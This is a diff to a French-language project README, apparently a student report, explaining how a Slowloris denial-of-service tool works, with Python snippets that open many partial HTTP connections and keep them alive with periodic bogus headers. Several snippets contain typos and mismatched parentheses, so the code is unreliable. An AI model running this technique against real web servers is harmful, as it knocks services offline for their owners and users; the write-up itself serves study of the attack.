@@ -51,6 +51,41 @@ Connection: close
 Content-Type: text/html; charset=iso-8859-1
 `
 
+Pour l'initialisation des sockets on envoie trois requêtes:
+```Python
+s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000).encode("utf-8"))
+s.send("User-Agent: {}\r\n".format(ua.USER_AGENT[random.randin(0,29)]).encode("utf-8"))
+s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5".encode("utf-8"))
+```
+Dans l'ordre:
+- La première initialise la connection
+- La deuxième envoie le user agent utilisé choisi aléatoirement dans la pool des user agents.
+- La troisième dit quelles sont les langues acceptées.
+
+-> A l'initialisation le slowloris va essayer d'initier autant de connections que l'on a demandé.
+
+Il va ensuite les garder en vie en les complétant toutes les 15 secondes avec:
+```Python
+s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+```
+Il va ensuite essayer à nouveau d'ouvrir des connections jusqu'à atteindre la limite que l'on a fixé.
+ ```Python
+ for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
+    try:
+        s = self.init_socks()
+        if s:
+            self.sockets_list.append(s)
+```
+Par la suite le slowloris va calculer la latence en faisant une requête dans un thread à part.
+
+```Python
+if not latence.is_alive():
+    latence.run()
+```
+
+
+
+
 
 ## 3. Difficultees rencontrees
 La principale difficultees fut d'ordre materiel, en essayant l'attaque sur un serveur distant, la box internet ma "banni", il etait impossible d'acceder a aucun site web en dehors, impossible d'utiliser un dns.
